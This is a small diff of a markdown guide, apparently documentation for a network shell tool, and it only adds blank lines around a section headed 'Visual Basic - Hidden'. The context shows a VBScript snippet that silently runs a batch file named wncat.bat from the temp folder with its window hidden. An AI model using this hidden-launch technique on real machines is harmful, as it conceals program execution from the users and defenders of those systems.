@@ -82,7 +82,9 @@ We use `-c` to run the script as one-liner from string. We export it onto a batc
 <br />
 
 #### Visual Basic - Hidden
+
 <br />
+
 `Dim WinScriptHost
 Set WinScriptHost = CreateObject("WScript.Shell")
 WinScriptHost.Run Chr(34) & "%TEMP%\wncat.bat" & Chr(34), 0
